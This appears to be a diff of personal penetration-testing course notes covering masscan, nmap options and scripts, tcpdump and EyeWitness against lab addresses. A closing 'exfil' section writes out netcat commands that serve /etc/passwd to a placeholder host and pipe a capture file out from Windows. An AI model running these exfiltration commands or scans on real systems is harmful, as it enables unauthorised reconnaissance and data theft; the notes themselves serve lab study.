@@ -1,3 +1,76 @@
-masscan index
+MASSCAN
+=======
 
-Scan command: masscan 10.130.10.0/24 --ports 22,23,80,443,8000-9000 -oB masscan_10.130.130.0_sub24_1004_ports
+Add firewall rule filter packets so OS doesn't send back RST to the scan targets:
+sudo iptables -A INPUT -p tcp --dport 55555 -j DROP
+
+Scan command:
+sudo masscan --ports 22,23,80,443,8000-9000 --rate 15000 --src-port=55555 -oB /tmp/local.masscan 127.0.0.1
+
+Additional args:
+--banners: Instead of sending a RST packet after a SYN-ACK, send an ACK (establish a full connection) and then look at the data sent by the server (such as SSH or SMTP banners)
+
+readscan to convert types:
+masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oG /tmp/masscan_10.130.10.0_24_full.gnmap
+
+================================================================================================================================
+View packets during network scans using tcpdump:
+sudo tcpdump -i tun0 -nn net 10.130.10.0/24
+================================================================================================================================
+
+NMAP
+====
+
+-n  : disable dns resolution
+-sT : scan using a TCP connect (so a full 3-way handshake will be done), if not specified, it will be a "stealth scan"
+-sU : perform udp scan
+-sV : perform version scanning (based on the probes and regex matching in the file /usr/share/nmap/nmap-service-probes)
+-O : performs OS fingerprinting. (this isn't as useful as it was once, best to just not use this)
+-A  : perform OS fingerprinting + version scan + script scan with default scripts + traceroute
+-F  : Fast scan using top-100 ports
+--top-ports : specify top N ports according to nmap
+--script=<script-name> : Run nmap script against the ports
+
+
+Probing options:
+-Pn (or -P0): Disable probing that determins if host is up, instead just assume host is alive 
+-PE : Send ICMP Echo request (type 8) for probing.
+-PP : Send ICMP Timestamp request (ICMP type 13)
+-PM : Send ICMP Address Mask Requet (ICMP type 17)
+-PR : Use ARP to identify hosts (only works with hosts on same subnet and is used by default if it's the same subnet) and must be root 
+-sN or -sP : only probe, not scan afterwards.
+-sL option (list scan): don't probe; instead it does reverse dns lookups for the network range and only for those IPs where a pointer record is returned a hostname is received in the DNS request, Nmap then scans the host.
+
+nmap-services file: the file from which Nmap gets its list of most frequent ports to scan, located at: less /usr/share/nmap/nmap-services
+nmap-scripts file: head /usr/share/nmap/scripts/script.db
+
+
+nmap scripts
+============
+
+Note: Scripts will not be executed if the appropriate service is not identified by nmap. So if -sV (version scanning) is not done, nmap will rely solely on the nmap-services files and match against the ports to infer the services running. This may result in the script never getting triggered.
+Best practice: Always include -sV along with the scripts option so the correct version is identified using probes + nmap service probes file.
+
+ssh-auth-methods : Find out the authentication methods supported for SSH (key vs password or both)
+
+
+======================================================================================================================================================================================
+
+EyeWitness
+==========
+
+/opt/eyewitness/Python/EyeWitness.py --web -x /tmp/webservers.xml (output of nmap -oX)
+
+
+
+
+exfil
+=====
+
+Linux -> Windows
+nc -nvlp 9999 < /etc/passwd
+nc.exe -nv -w 1 LINUX_ETH0_ADDRESS(SRC_IP) 9999
+
+
+Windows -> Linux
+cat C:\CourseFiles\capture.pcap -AsByteStream | nc.exe -nvlp 9999 -w 1
